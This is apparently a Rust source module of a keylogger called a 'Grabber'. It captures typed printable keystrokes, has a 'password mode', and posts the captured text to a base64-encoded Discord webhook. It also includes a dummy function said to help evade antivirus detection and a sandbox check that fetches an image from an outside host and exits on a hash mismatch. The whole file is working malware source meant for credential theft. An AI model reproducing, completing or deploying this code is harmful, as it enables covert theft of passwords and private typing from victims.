use rdev::Key;
use reqwest::header::CONTENT_TYPE;
// use std::hash::Hash;
use std::io::Read;
use std::process::exit;
use std::{
    sync::mpsc::{Receiver, Sender},
    time::{Duration, Instant},
};

// Grabber Configuration.

// change this to add `modifier` keys to ignore
pub const MODIFIER_KEYS: [Key; 4] = [Key::Alt, Key::AltGr, Key::MetaLeft, Key::MetaRight];

// changes the timeout after pressing a modifier key to ignore a typed key.
// set this to something low.
pub const TIMEOUT: Duration = Duration::from_millis(10);

// change this to your webhook URL, encoded in base64
pub const HOOK_URL: &str = "WEBHOOK";

// Change this to capture whole sentences or just the end (password mode).
pub const GET_SENTENCES: bool = false;

/// Cleans up the main function by moving code to handle ¨normal¨ keys here.
/// There are a lot of params which have to be passed in unfortunately.
pub fn handle_key(
    event: Option<String>,
    ctrl_held: bool,
    modkey_held: bool,
    cursor_pos: &mut usize,
    current_word_buf: &mut Vec<String>,
) {
    // ignore anything that isn't valid ascii
    if let Some(key) = event {
        // only log ascii characters. and only log if we aren't doing a
        // keyboard shortcut.
        if check_latin_character(&key) && !ctrl_held && !modkey_held {
            // Do something with the key.
            current_word_buf.insert(*cursor_pos, key);
            *cursor_pos += 1;
            println!("{:?} {}", current_word_buf, ctrl_held);
        }
    }
}

/// checks whether or not the key is 'valid'
/// e.g. not a control character.
pub fn check_latin_character(key: &str) -> bool {
    if let Some(key_byte) = key.bytes().last() {
        // Check if the letter is a simple ASCII char,
        // these are usually the only valid characters in a password.
        if key_byte.is_ascii()
            && key.bytes().last() < Some(127_u8)
            && key.bytes().last() > Some(31_u8)
        {
            return true;
        }
        return false;
    }
    false
}

/// Returns whether a 'timer' on another thread has finished
/// Use to check for modkey and ctrl presses, as well as anything else...
/// Might be overcomplicated but this made sense earlier for whatever reason.
pub fn timer_done(rx: &Receiver<Instant>, _timeout: Duration) -> bool {
    match rx.try_recv() {
        Ok(timer) => timer.elapsed() >= _timeout,
        Err(_) => false,
    }
}

/// Starts a timer which sends itself to the main thread.
pub fn start_timer(tx: Sender<Instant>) -> Result<(), std::sync::mpsc::SendError<Instant>> {
    let start_time = Instant::now();
    tx.send(start_time)?;
    Ok(())
}

/// To make methods that take &self for Vec<String>.
pub trait VectorExt {
    /// Appends to the log, for now it will be a discord webhook because why not?
    fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>>;
}

impl VectorExt for Vec<String> {
    /// Appends to the log, for now it will be a discord webhook because why not?
    /// TODO: Stop being lazy.
    fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut url = String::new();

        base64_url::decode(&HOOK_URL)
            .expect("is there a webhook and is it in base64url? please check.")
            .as_slice()
            .read_to_string(&mut url)?;

        let payload = format!("{{\"content\":\"{}\"}}", self.join(""));
        reqwest::blocking::Client::new()
            .post(url)
            .body(payload)
            .header(CONTENT_TYPE, "application/json")
            .send()?;

        Ok(())
    }
}

/// Does nothing, might help with AV detection.
#[allow(unused)]
pub fn do_nothing() {
    let mut cnt = 0;
    for n in 0..100 {
        cnt = n;
    }
}

/// Sandboxing checks. Also fails the program if the user isn't connected to the internet.
pub fn read_from_url() {
    let image_bytes =
        reqwest::blocking::get("https://netsec.expert/images/crypter-fud-transition.png")
            .unwrap()
            .bytes()
            .unwrap();

    let hash = format!("{:x}", md5::compute(image_bytes));
    let r_hash = "eb38b432ad0f364c6aea1d5cac964032";

    if hash != r_hash {
        exit(1);
    }
}
